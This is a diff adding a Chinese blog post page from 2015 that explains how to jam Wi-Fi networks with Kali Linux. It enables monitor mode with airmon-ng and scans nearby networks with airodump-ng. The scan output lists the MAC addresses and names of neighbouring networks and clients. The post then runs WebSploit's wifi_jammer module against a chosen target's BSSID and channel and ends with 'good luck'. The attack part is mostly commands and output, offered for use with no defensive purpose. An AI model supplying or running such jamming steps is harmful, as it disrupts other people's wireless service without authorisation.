@@ -1,0 +1,350 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh_CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>kali下进行wifi干扰 | Tyan | AbyChan | Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Tyan">
+    
+    <meta name="description" content="wifi干扰, so good
+首先启动混杂模式ifconfig查看interface1airmon-ng start wlan0
+12345678910111213141516171819Found 5 processes that could cause trouble.If airodump-">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="Tyan | AbyChan | Blog" title="Tyan | AbyChan | Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Tyan | AbyChan | Blog">Tyan | AbyChan | Blog</a></h1>
+				<h2 class="blog-motto">沙漠的另一边 沙漠罢了</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜單">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:tyan.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/04/30/kali下进行wifi干扰/" title="kali下进行wifi干扰" itemprop="url">kali下进行wifi干扰</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://tyan.io" title="Tyan">Tyan</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2015-04-30T04:03:27.000Z" itemprop="datePublished">2015-04-30</time>
+    更新日期:<time datetime="2015-07-17T02:58:34.284Z" itemprop="dateModified">2015-07-17</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目錄</strong>
+		
+		</div>
+		
+		<p>wifi干扰, so good</p>
+<p>首先启动混杂模式<br>ifconfig查看interface<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Found <span class="number">5</span> processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to <span class="built_in">kill</span> (some of) them!</span><br><span class="line"><span class="operator">-e</span></span><br><span class="line">PID Name</span><br><span class="line"><span class="number">2595</span>    NetworkManager</span><br><span class="line"><span class="number">2678</span>    wpa_supplicant</span><br><span class="line"><span class="number">3097</span>    dhclient</span><br><span class="line"><span class="number">7173</span>    dhclient</span><br><span class="line"><span class="number">7268</span>    dhclient</span><br><span class="line">Process with PID <span class="number">7268</span> (dhclient) is running on interface wlan2</span><br><span class="line">Process with PID <span class="number">7173</span> (dhclient) is running on interface wlan0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface   Chipset     Driver</span><br><span class="line"></span><br><span class="line">wlan2       Ralink <span class="number">2573</span> USB rt73usb - [phy9]</span><br><span class="line">wlan0       Atheros AR9285  ath9k - [phy0]</span><br><span class="line">                (monitor mode enabled on mon0)</span><br></pre></td></tr></table></figure>
+<p>然后airodump mon0<br>看到一大堆wifi</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">CH  <span class="number">5</span> ][ Elapsed: <span class="number">12</span> s ][ <span class="number">2015</span>-<span class="number">02</span>-<span class="number">20</span> <span class="number">11</span>:<span class="number">26</span> ][ WPA handshake: D4:EE:<span class="number">07</span>:<span class="number">1</span>C:<span class="number">4</span>B:<span class="number">92</span></span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span></span><br><span class="line"></span><br><span class="line"> <span class="number">70</span>:<span class="number">3</span>A:D8:<span class="number">11</span>:<span class="number">46</span>:E8  -<span class="number">86</span>        <span class="number">3</span>        <span class="number">0</span>    <span class="number">0</span>  <span class="number">11</span>  <span class="number">54</span>e. WPA  CCMP   PSK  llp</span><br><span class="line"> C8:<span class="number">3</span>A:<span class="number">35</span>:<span class="number">50</span>:<span class="number">5</span>B:<span class="number">88</span>  -<span class="number">88</span>        <span class="number">3</span>        <span class="number">0</span>    <span class="number">0</span>  <span class="number">10</span>  <span class="number">54</span>e  WPA  CCMP   PSK  Tenda_505B88</span><br><span class="line"> <span class="number">62</span>:<span class="number">89</span>:E4:<span class="number">44</span>:<span class="number">4</span>A:<span class="number">76</span>  -<span class="number">60</span>       <span class="number">26</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">7</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  USER_3004</span><br><span class="line"> A0:<span class="number">89</span>:E4:<span class="number">44</span>:<span class="number">4</span>A:<span class="number">75</span>  -<span class="number">58</span>       <span class="number">26</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">7</span>  <span class="number">54</span>e  OPN              &lt;length:  <span class="number">6</span>&gt;</span><br><span class="line"> D4:EE:<span class="number">07</span>:<span class="number">1</span>C:<span class="number">4</span>B:<span class="number">92</span>  -<span class="number">61</span>       <span class="number">28</span>        <span class="number">8</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  HiWiFi_1C4B92</span><br><span class="line"> <span class="number">6</span>C:E8:<span class="number">73</span>:F7:<span class="number">19</span>:<span class="number">98</span>  -<span class="number">64</span>       <span class="number">18</span>        <span class="number">1</span>    <span class="number">0</span>   <span class="number">6</span>  <span class="number">54</span>e. WPA2 CCMP   PSK  JaydanKuk</span><br><span class="line"> <span class="number">50</span>:BD:<span class="number">5</span>F:<span class="number">19</span>:A1:<span class="number">2</span>D  -<span class="number">71</span>       <span class="number">22</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">6</span>  <span class="number">54</span>e. WPA2 CCMP   PSK  TP-LINK_A12D</span><br><span class="line"> <span class="number">80</span>:<span class="number">89</span>:<span class="number">17</span>:<span class="number">11</span>:A8:<span class="number">3</span>F  -<span class="number">73</span>        <span class="number">0</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">6</span>  <span class="number">54</span>e. WPA2 CCMP   PSK  ZLINFENG_Network</span><br><span class="line"> <span class="number">08</span>:<span class="number">10</span>:<span class="number">77</span>:<span class="number">8</span>C:D7:<span class="number">9</span>F  -<span class="number">82</span>        <span class="number">2</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">6</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  li3003</span><br><span class="line"> <span class="number">58</span>:<span class="number">87</span>:E2:<span class="number">6</span>D:F2:<span class="number">2</span>C  -<span class="number">82</span>       <span class="number">19</span>        <span class="number">2</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  OPN              Coship_6DF22C</span><br><span class="line"> <span class="number">58</span>:<span class="number">87</span>:E2:<span class="number">1</span>D:<span class="number">4</span>A:D6  -<span class="number">84</span>       <span class="number">12</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  OPN              Coship_1D4AD6</span><br><span class="line"> <span class="number">58</span>:<span class="number">87</span>:E2:<span class="number">6</span>D:E8:<span class="number">6</span>C  -<span class="number">85</span>        <span class="number">9</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  OPN              Coship_6DE86C</span><br><span class="line"> <span class="number">80</span>:<span class="number">89</span>:<span class="number">17</span>:<span class="number">56</span>:D6:<span class="number">3</span>D  -<span class="number">88</span>        <span class="number">5</span>        <span class="number">0</span>    <span class="number">0</span>  <span class="number">11</span>  <span class="number">54</span>e. WPA2 CCMP   PSK  <span class="number">2503</span></span><br><span class="line"> <span class="number">58</span>:<span class="number">87</span>:E2:<span class="number">36</span>:A5:<span class="number">30</span>  -<span class="number">88</span>       <span class="number">15</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  Coship_3104</span><br><span class="line"> A0:<span class="number">89</span>:E4:<span class="number">31</span>:BD:<span class="number">7</span>C  -<span class="number">88</span>       <span class="number">10</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  OPN              &lt;length:  <span class="number">6</span>&gt;</span><br><span class="line"> <span class="number">64</span>:<span class="number">09</span>:<span class="number">80</span>:<span class="number">08</span>:<span class="number">79</span>:<span class="number">37</span>  -<span class="number">90</span>       <span class="number">10</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">3</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  cngugu</span><br><span class="line"> <span class="number">6</span>A:<span class="number">89</span>:E4:<span class="number">31</span>:BD:<span class="number">7</span>D  -<span class="number">90</span>       <span class="number">11</span>        <span class="number">0</span>    <span class="number">0</span>   <span class="number">1</span>  <span class="number">54</span>e  WPA2 CCMP   PSK  USER_2802</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe</span><br><span class="line"></span><br><span class="line"> (not associated)   D4:<span class="number">97</span>:<span class="number">0</span>B:<span class="number">53</span>:<span class="number">5</span>D:<span class="number">57</span>  -<span class="number">90</span>    <span class="number">0</span> - <span class="number">1</span>      <span class="number">1</span>        <span class="number">4</span></span><br><span class="line"> (not associated)   <span class="number">44</span>:<span class="number">33</span>:<span class="number">4</span>C:EE:<span class="number">1</span>F:<span class="number">84</span>  -<span class="number">92</span>    <span class="number">0</span> - <span class="number">1</span>      <span class="number">0</span>        <span class="number">2</span></span><br><span class="line"> D4:EE:<span class="number">07</span>:<span class="number">1</span>C:<span class="number">4</span>B:<span class="number">92</span>  CC:AF:<span class="number">78</span>:<span class="number">29</span>:FD:<span class="number">9</span>D    <span class="number">0</span>    <span class="number">1</span>e- <span class="number">1</span>      <span class="number">0</span>      <span class="number">165</span>  HiWiFi_1C4B92</span><br><span class="line"> <span class="number">6</span>C:E8:<span class="number">73</span>:F7:<span class="number">19</span>:<span class="number">98</span>  <span class="number">04</span>:<span class="number">1</span>B:BA:<span class="number">3</span>D:<span class="number">54</span>:D4   -<span class="number">1</span>    <span class="number">0</span>e- <span class="number">0</span>      <span class="number">0</span>        <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>打开另一个终端<br>启动websploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># websploit</span></span><br><span class="line">WARNING: No route found <span class="keyword">for</span> IPv6 destination :: (no default route?)</span><br><span class="line"></span><br><span class="line">db   d8b   db d88888b d8888b. .d8888. d8888b. db       .d88b.  d888888b d888888b</span><br><span class="line"><span class="number">88</span>   I8I   <span class="number">88</span> <span class="number">88</span><span class="string">'     88  `8D 88'</span>  YP <span class="number">88</span>  `<span class="number">8</span>D <span class="number">88</span>      .<span class="number">8</span>P  Y8.   `<span class="number">88</span><span class="string">'   `~~88~~'</span></span><br><span class="line"><span class="number">88</span>   I8I   <span class="number">88</span> <span class="number">88</span>ooooo <span class="number">88</span>oooY<span class="string">' `8bo.   88oodD'</span> <span class="number">88</span>      <span class="number">88</span>    <span class="number">88</span>    <span class="number">88</span>       <span class="number">88</span></span><br><span class="line">Y8   I8I   <span class="number">88</span> <span class="number">88</span>~~~~~ <span class="number">88</span>~~~b.   `Y8b. <span class="number">88</span>~~~   <span class="number">88</span>      <span class="number">88</span>    <span class="number">88</span>    <span class="number">88</span>       <span class="number">88</span></span><br><span class="line">`<span class="number">8</span>b d8<span class="string">'8b d8'</span> <span class="number">88</span>.     <span class="number">88</span>   <span class="number">8</span>D db   <span class="number">8</span>D <span class="number">88</span>      <span class="number">88</span>booo. `<span class="number">8</span>b  d8<span class="string">'   .88.      88</span><br><span class="line"> `8b8'</span> `<span class="number">8</span>d8<span class="string">'  Y88888P Y8888P'</span> `<span class="number">8888</span>Y<span class="string">' 88      Y88888P  `Y88P'</span>  Y888888P    YP</span><br><span class="line"></span><br><span class="line">        --=[WebSploit FrameWork</span><br><span class="line">    +---**---==[Version :<span class="number">2.0</span>.<span class="number">5</span> BETA</span><br><span class="line">    +---**---==[Codename :We<span class="string">'re Not Crying Wolf</span><br><span class="line">    +---**---==[Available Modules : 19</span><br><span class="line">        --=[Update Date : [r2.0.5-000 2.3.2014]</span></span><br></pre></td></tr></table></figure>
+<p>输入use wifi/wifi_jammer<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p>
+<p>然后设置频道，essid，bssid<br>就是用airodump-ng扫出来的那些<br>选择的自己目标<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> bsssid <span class="number">6</span>C:E8:<span class="number">73</span>:F7:<span class="number">19</span>:<span class="number">98</span></span><br><span class="line"><span class="built_in">set</span> essid xxxxx</span><br><span class="line"><span class="built_in">set</span> channel <span class="number">6</span></span><br></pre></td></tr></table></figure></p>
+<p>然后RUN<br>就会弹出几个终端，已经开始干扰了<br>good luck</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/kali/">kali</a><a href="/tags/wifi/">wifi</a><a href="/tags/wifi干扰/">wifi干扰</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://tyan.io/2015/04/30/kali下进行wifi干扰/" data-title="kali下进行wifi干扰 | Tyan | AbyChan | Blog" data-tsina="null" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/05/10/教你用Django实现一个简单的GIS功能/" title="教你用Django实现一个简单的GIS功能">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  教你用Django实现一个简单的GIS功能</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/04/30/arm-linux手工安装metasploit笔记/"  title="linux手工安装metasploit笔记">
+ <strong>NEXT:</strong><br/> 
+ <span>linux手工安装metasploit笔记
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="顯示側邊欄"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目錄</strong>
+  
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隱藏側邊欄"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">標簽</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/R/" title="R">R<sup>1</sup></a></li>
+		
+			<li><a href="/tags/RMysql/" title="RMysql">RMysql<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Web前端架构/" title="Web前端架构">Web前端架构<sup>1</sup></a></li>
+		
+			<li><a href="/tags/angular/" title="angular">angular<sup>1</sup></a></li>
+		
+			<li><a href="/tags/arm/" title="arm">arm<sup>1</sup></a></li>
+		
+			<li><a href="/tags/binary/" title="binary">binary<sup>1</sup></a></li>
+		
+			<li><a href="/tags/c4-5/" title="c4.5">c4.5<sup>1</sup></a></li>
+		
+			<li><a href="/tags/cb4/" title="cb4">cb4<sup>1</sup></a></li>
+		
+			<li><a href="/tags/chrome/" title="chrome">chrome<sup>1</sup></a></li>
+		
+			<li><a href="/tags/chroot/" title="chroot">chroot<sup>2</sup></a></li>
+		
+			<li><a href="/tags/chroot-jail/" title="chroot jail">chroot jail<sup>1</sup></a></li>
+		
+			<li><a href="/tags/css/" title="css">css<sup>1</sup></a></li>
+		
+			<li><a href="/tags/css3/" title="css3">css3<sup>1</sup></a></li>
+		
+			<li><a href="/tags/cubieboard/" title="cubieboard">cubieboard<sup>1</sup></a></li>
+		
+			<li><a href="/tags/database/" title="database">database<sup>3</sup></a></li>
+		
+			<li><a href="/tags/dhcp/" title="dhcp">dhcp<sup>1</sup></a></li>
+		
+			<li><a href="/tags/django/" title="django">django<sup>2</sup></a></li>
+		
+			<li><a href="/tags/emacs/" title="emacs">emacs<sup>1</sup></a></li>
+		
+			<li><a href="/tags/emasc美化/" title="emasc美化">emasc美化<sup>1</sup></a></li>
+		
+			<li><a href="/tags/fcitx/" title="fcitx">fcitx<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="null" target="_blank" title="rss">RSS 訂閱</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2015 
+		
+		<a href="http://tyan.io" target="_blank" title="Tyan">Tyan</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+  </body>
+</html>
